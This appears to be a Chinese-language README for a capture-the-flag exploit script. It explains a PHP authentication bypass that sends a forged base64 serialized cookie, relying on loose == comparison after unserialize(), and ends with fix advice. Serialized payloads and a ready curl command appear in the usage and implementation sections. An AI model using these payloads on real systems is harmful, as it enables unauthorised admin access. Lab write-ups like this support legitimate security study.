# X-014-24 Exploit

目标存在基于 Cookie 的不安全认证逻辑：客户端可控的 `serialize()+base64`，服务端 `unserialize()` 后用弱比较 `==` 校验：

```php
if ($auth['username'] == 'admin' && $auth['password'] == $password) { ... }
```

利用 PHP 弱类型比较，可将 `password` 伪造成整数 `0` 或布尔 `true`，使比较成立，从而拿到 flag。

## 目标信息
- 默认目标：`http://ip32778/index.php`
- 可通过参数覆盖主机和端口

## 使用方式

1) 直接运行脚本（默认目标）

```bash
python3 exp.py
```

2) 指定 `host port`：

```bash
python3 exp.py ip 32778
```

3) 指定完整 URL：

```bash
python3 exp.py http://ip32778/index.php
```

成功时在标准输出打印形如 `FLAG{...}` 的 flag。

## 实现细节

脚本构造两种序列化 payload，取其一即可绕过：

```text
a:2:{s:8:"username";s:5:"admin";s:8:"password";i:0;}   # password 为整数 0
a:2:{s:8:"username";s:5:"admin";s:8:"password";b:1;}   # password 为布尔 true
```

将其 base64 后作为 `creds` Cookie 发送，即可在页面中获得：

```
Congratulations, here is the flag: FLAG{...}
```

等价 curl 示例（整数 0 变种）：

```bash
curl -s 'http://ip32778/index.php' \
  -H 'Cookie: creds=YToyOntzOjg6InVzZXJuYW1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtpOjA7fQ=='
```

## 修复建议（供参考）
- 使用严格比较 `===`；
- 禁止对用户可控数据 `unserialize()`，改用 `json_decode()`；
- 对 Cookie 做签名（HMAC）或采用服务端会话。

